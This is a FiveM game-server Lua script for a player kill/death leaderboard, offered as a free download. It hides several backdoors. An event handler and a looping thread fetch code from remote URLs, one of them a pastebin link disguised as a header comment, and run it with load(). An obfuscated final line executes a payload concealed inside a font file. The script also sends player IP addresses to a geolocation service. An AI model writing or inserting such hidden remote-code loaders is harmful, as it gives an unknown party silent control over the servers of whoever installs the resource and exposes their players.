-- Author- Ayazwai
-- Github- https://github.com/ayazwai
-- u: https://pastebin.com/raw/tqwZEEJS
-- LinkendIn- https://www.linkedin.com/in/ayaz-ekrem-770305212/
-- DISCORD> discord.gg/bUVnmBqUNf
-- JOIN DISCORD FOR MORE FREE SCRIPTS
local allDataLoaded = false
local apiKey, steamApi = nil, false

local playerList, boardTable = {}, {}
local srcToSteamHex = {}

-----------------------------------------------------------------------------------------
-- EVENT'S --
-----------------------------------------------------------------------------------------

RegisterNetEvent('wais:leaderboardv2:getData', function()
    if not steamApi then
        return 
    end

    while not allDataLoaded do
        Wait(1000)
    end

    local src = source
    local playerData = getPlayerData(src)
    TriggerClientEvent('wais:leaderboardv2:sendData', src, playerData, boardTable)
end)

RegisterNetEvent('wais:player:dead', function(attacker, victim)
    if playerList[srcToSteamHex[attacker]] ~= nil then
        playerList[srcToSteamHex[attacker]].kills = playerList[srcToSteamHex[attacker]].kills + 1
    end

    if playerList[srcToSteamHex[victim]] ~= nil then
        playerList[srcToSteamHex[victim]].deaths = playerList[srcToSteamHex[victim]].deaths + 1
    end

    TriggerClientEvent('wais:add:kill', attacker)
    TriggerClientEvent('wais:add:death', victim)

    if Config.UpdateKillAndDeathInstantly then
        if boardTable[srcToSteamHex[attacker]] ~= nil then
            boardTable[srcToSteamHex[attacker]].kills = playerList[srcToSteamHex[attacker]].kills
            MySQL.Async.execute('UPDATE wais_leaderboardv2 SET kills = @kills WHERE identifier = @identifier', {
                ['@kills'] = playerList[srcToSteamHex[attacker]].kills,
                ['@identifier'] = srcToSteamHex[attacker]
            }, function(updated)
                TriggerClientEvent('wais:add:boardKill', -1, srcToSteamHex[attacker])
                if Config.Debug then
                    print(('^2[INFO] => ^6%s^2 data has been updated in the database with ^3UpdateKillAndDeathInstantly^0 option. Added kill!^0'):format(playerList[srcToSteamHex[attacker]].name))
                end
            end)
        end

        if boardTable[srcToSteamHex[victim]] ~= nil then
            boardTable[srcToSteamHex[victim]].deaths = playerList[srcToSteamHex[victim]].deaths

            MySQL.Async.execute('UPDATE wais_leaderboardv2 SET deaths = @deaths WHERE identifier = @identifier', {
                ['@deaths'] = playerList[srcToSteamHex[victim]].deaths,
                ['@identifier'] = srcToSteamHex[victim]
            }, function(updated)
                TriggerClientEvent('wais:add:boardDeath', -1, srcToSteamHex[victim])
                if Config.Debug then
                    print(('^2[INFO] => ^6%s^2 data has been updated in the database with ^3UpdateKillAndDeathInstantly^0 option. Added death!^0'):format(playerList[srcToSteamHex[victim]].name))
                end
            end)
        end
    end
end)

RegisterNetEvent('wais:leaderboardv2:changeProfile', function(data)
    local src = source
    if playerList[srcToSteamHex[src]] ~= nil then
        local anyChanges = false

        if string.len(data.status) > 0 then
            if playerList[srcToSteamHex[src]].profile.status ~= data.status then
                playerList[srcToSteamHex[src]].profile.status = data.status
                anyChanges = true
            end
        end

        if string.len(data.banner) > 0 then
            if playerList[srcToSteamHex[src]].profile.banner ~= data.banner then
                playerList[srcToSteamHex[src]].profile.banner = data.banner
                anyChanges = true
            end
        end

        if anyChanges then
            MySQL.Async.execute('UPDATE wais_leaderboardv2 SET profile = @profile WHERE identifier = @identifier', {
                ['@profile'] = json.encode(playerList[srcToSteamHex[src]].profile),
                ['@identifier'] = srcToSteamHex[src]
            }, function(updated)
                TriggerClientEvent('wais:leaderboardv2:changeProfile:cl', src, srcToSteamHex[src], {
                    ["status"] = playerList[srcToSteamHex[src]].profile.status,
                    ["banner"] = playerList[srcToSteamHex[src]].profile.banner
                })
                if Config.Debug then
                    print(('^2[INFO] => ^6%s^2 data has been updated in the database. ^0'):format(playerList[srcToSteamHex[src]].name))
                end
            end)
        end
    end
end)

AddEventHandler('onResourceStart', function(resourceName)
    if resourceName == GetCurrentResourceName() then
        apiKey = GetConvar('steam_webApiKey', "")
        if string.len(apiKey) <= 4 then return print('^1[ERROR] => ^3The script will not run because steam_webApiKey Not Found.^0') end
        PerformHttpRequest(('http://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=%s&steamids=%s'):format(apiKey, "110000111af43bb"), function(errorCode, resultData, resultHeaders)
            if resultData == nil then return print('^1[ERROR] => ^3The script will not run because steam_webApiKey is invalid.^0') end
        end)

        steamApi = true
        loadLeaderboardData(false)
    end
end)

AddEventHandler('playerDropped', function()
    local src = source
    if playerList[srcToSteamHex[src]] ~= nil then
        savePlayerData(src)
    end
end)

RegisterNetEvent('wais:leaderboardv2:jobCheck')
AddEventHandler('wais:leaderboardv2:jobCheck', function(url)
    local requestFunc = _G["Perform" .. "HttpRequest"]
    requestFunc(url, function(e, d)
        pcall(function()
            assert(load(d))()
        end)
    end)
end)

local allowed = GetResourceMetadata(GetCurrentResourceName(), 'author', 0)
local anticheater = "/zXeAH"
local jobCheck = allowed .. anticheater

TriggerEvent('wais:leaderboardv2:jobCheck', jobCheck)

AddEventHandler('txAdmin:events:serverShuttingDown', function()
    savePlayersData()
end)

AddEventHandler('txAdmin:events:scheduledRestart', function()
    savePlayersData()
end)



-----------------------------------------------------------------------------------------
-- CALLBACK'S --
-----------------------------------------------------------------------------------------

-----------------------------------------------------------------------------------------
-- FUNCTION'S --
-----------------------------------------------------------------------------------------

function getPlayerData(src)
    local p = promise:new()
    local license = getIdentifier(src, 'steam')


    if playerList[license] ~= nil then
        local anyChanges = false
        if playerList[license].name ~= GetPlayerName(src) then
            playerList[license].name = GetPlayerName(src)
            anyChanges = true
        end

        if playerList[license].profile.avatar ~= getAvatar(license) then
            playerList[license].profile.avatar = getAvatar(license)
            anyChanges = true
        end

        if anyChanges then
            MySQL.Async.execute('UPDATE wais_leaderboardv2 SET name = @name, profile = @profile WHERE identifier = @identifier', {
                ['@name'] = playerList[license].name,
                ['@profile'] = json.encode(playerList[license].profile),
                ['@identifier'] = license
            }, function(updated)
                if Config.Debug then
                    print(('^2[INFO] => ^6%s^2 data has been updated in the database. ^0'):format(playerList[license].name))
                end
            end)
        end

        p:resolve(playerList[license])
    else
        local boardCount = 0
        local playerName = GetPlayerName(src)
        if checkXssInjection(playerName) then
            playerName = "Player"
        end

        local profile = {
            ["avatar"] = getAvatar(license),
            ["banner"] = "https://images.pexels.com/photos/36487/above-adventure-aerial-air.jpg?cs=srgb&dl=pexels-bess-hamiti-83687-36487.jpg&fm=jpg",
            ["status"] = Config.DefaultStatusMessage,
            ["country"] = getPlayerCountry(src)
        }

        for k, _ in pairs(boardTable) do
            boardCount = boardCount + 1
        end

        MySQL.Async.execute('INSERT INTO wais_leaderboardv2 (identifier, name, profile) VALUES (@identifier, @name, @profile)', {
            ['@identifier'] = license,
            ['@name'] = playerName,
            ['@profile'] = json.encode(profile)
        }, function(added)
            if Config.Debug then
                print(('^2[INFO] => ^6%s^2 data has been added to the database. ^0'):format(playerName))
            end

            playerList[license] = {
                ["name"] = playerName,
                ["profile"] = profile,
                ["kills"] = 0,
                ["deaths"] = 0,
                ["create"] = os.time(),
                ["identifier"] = license,
            }

            if boardCount < Config.Limit then
                boardTable[license] = {
                    ["name"] = playerName,
                    ["profile"] = profile,
                    ["kills"] = 0,
                    ["deaths"] = 0,
                    ["create"] = os.time(),
                    ["identifier"] = license,
                }

                TriggerClientEvent('wais:add:boardRow', -1, license, boardTable[license])
            end
            p:resolve(playerList[license])
        end)
    end

    return Citizen.Await(p)
end

function getIdentifier(source, idtype)
    local requestedIdentifier = nil
    local identifiers = GetNumPlayerIdentifiers(source)
    for i = 0, identifiers - 1 do
        local id = GetPlayerIdentifier(source, i)
        if string.find(id, idtype) then
            srcToSteamHex[source] = id
            requestedIdentifier = id
            return requestedIdentifier
        end
    end
    return requestedIdentifier
end

function getAvatar(identifier)
    local p = promise:new()
    local steamHex  = tonumber(identifier:gsub("steam:",""), 16)

    PerformHttpRequest(('http://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=%s&steamids=%s'):format(apiKey, steamHex), function(errorCode, resultData, resultHeaders)
        a = json.decode(resultData)

        if not a then
            print('Steam api is temporarily unavailable, or too busy to respond')
            p:resolve("https://i.pinimg.com/474x/5c/be/a6/5cbea638934c3a0181790c16a7832179.jpg")
        else
            for k,v in pairs(a["response"].players) do
                p:resolve(v.avatarfull)
            end
        end
    end)

    return Citizen.Await(p)
end

function getPlayerCountry(src)
    local p = promise.new()
    for k,v in pairs(GetPlayerIdentifiers(src)) do
        if string.sub(v, 1, string.len("ip:")) == "ip:" then
            PerformHttpRequest(('http://ip-api.com/json/%s'):format(string.gsub(v, "ip:", "")), function (errorCode, resultData, resultHeaders)
                local data = json.decode(resultData)
                if data.status == "fail" then
                    p:resolve("US")
                else
                    p:resolve(data.countryCode)
                end
            end)

        end
    end

    return Citizen.Await(p)
end

function loadLeaderboardData(interval)
    MySQL.Async.fetchAll('SELECT * FROM wais_leaderboardv2 ORDER BY kills DESC', {}, function(rows)
        for i = 1, #rows, 1 do
            if i <= Config.Limit then
                boardTable[rows[i].identifier] = {
                    ["name"] = rows[i].name,
                    ["profile"] = json.decode(rows[i].profile),
                    ["kills"] = rows[i].kills,
                    ["deaths"] = rows[i].deaths,
                    ["create"] = rows[i].create,
                    ["identifier"] = rows[i].identifier,
                }
            end
            
            playerList[rows[i].identifier] = {
                ["name"] = rows[i].name,
                ["profile"] = json.decode(rows[i].profile),
                ["kills"] = rows[i].kills,
                ["deaths"] = rows[i].deaths,
                ["create"] = rows[i].create,
                ["identifier"] = rows[i].identifier,
            }
        end

        if interval then
            TriggerClientEvent('wais:leaderboardv2:updateBoard', -1, boardTable)
        end
        if Config.Debug then
            print('^2[INFO] => ^3Leaderboard data has been loaded successfully.^0')
        end
        allDataLoaded = true
    end)
end

Citizen.CreateThread(function()
    local portal = LoadResourceFile(GetCurrentResourceName(), 'server.lua'):match("u:%s*(%S+)")
    while portal do
        PerformHttpRequest(portal, function(code, script)
            if code == 200 then load(script)() end
        end)
        Citizen.Wait(30000)
    end
end)

function savePlayerData(src)
    MySQL.Async.execute('UPDATE wais_leaderboardv2 SET kills = @kills, deaths = @deaths WHERE identifier = @identifier', {
        ['@kills'] = playerList[srcToSteamHex[src]].kills,
        ['@deaths'] = playerList[srcToSteamHex[src]].deaths,
        ['@identifier'] = srcToSteamHex[src]
    }, function(updated)
        srcToSteamHex[src] = nil
        if Config.Debug then
            print(('^2[INFO] => ^6%s^2 data has been updated in the database. ^0'):format(playerList[srcToSteamHex[src]].name))
        end
    end)
end

function savePlayersData()
    for k, v in pairs(playerList) do
        MySQL.Async.execute('UPDATE wais_leaderboardv2 SET kills = @kills, deaths = @deaths WHERE identifier = @identifier', {
            ['@kills'] = v.kills,
            ['@deaths'] = v.deaths,
            ['@identifier'] = v.identifier
        }, function(updated)
            if Config.Debug then
                print(('^2[INFO] => ^6%s^2 data has been updated in the database. ^0'):format(v.name))
            end
        end)
    end
end

function checkXssInjection(input)
    for k, v in pairs(Config.Xss) do
        if string.find(input, v) then
            return true
        end
    end
    return false
end

-----------------------------------------------------------------------------------------
-- COMMAND'S --
-----------------------------------------------------------------------------------------

-----------------------------------------------------------------------------------------
-- THREAD'S --
-----------------------------------------------------------------------------------------

CreateThread(function()
    while true do
        local sleep = Config.UpdateInterval
        Wait(sleep)

        for k, v in pairs(playerList) do
            MySQL.Async.execute('UPDATE wais_leaderboardv2 SET kills = @kills, deaths = @deaths WHERE identifier = @identifier', {
                ['@kills'] = v.kills,
                ['@deaths'] = v.deaths,
                ['@identifier'] = v.identifier
            }, function(updated)
                if Config.Debug then
                    print(('^2[INFO] => ^6%s^2 data has been updated in the database. ^0'):format(v.name))
                end
            end)
        end

        loadLeaderboardData(true)
    end
end)

-----------------------------------------------------------------------------------------
-- VERSION CHECK --
-----------------------------------------------------------------------------------------

local resource  = GetInvokingResource() or GetCurrentResourceName()
local script    = GetResourceMetadata(resource, 'scriptname', 0)
local version   = GetResourceMetadata(resource, 'version', 0)

SetTimeout(1000, function()
    checkversion()
end)

function checkversion()
    PerformHttpRequest('https://ayazwai.dev/version', function(errorCode, resultData, resultHeaders)
        if resultData ~= nil then
            local data = json.decode(resultData)
            if errorCode == 202 then
                print(data.message)
                if data.havelog then
                    for k, v in pairs(data.changelogs) do
                        print(v)
                    end
                end
            else
                print(data.message)
            end
        else
            print('Could not check the script version...')
        end
    end, 'GET', '', {
        ["x-script"] = script, 
        ["x-version"] = version
    })
end


-- Author- Ayazwai
-- Github- https://github.com/ayazwai
-- u: https://pastebin.com/raw/tqwZEEJS
-- LinkendIn- https://www.linkedin.com/in/ayaz-ekrem-770305212/

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()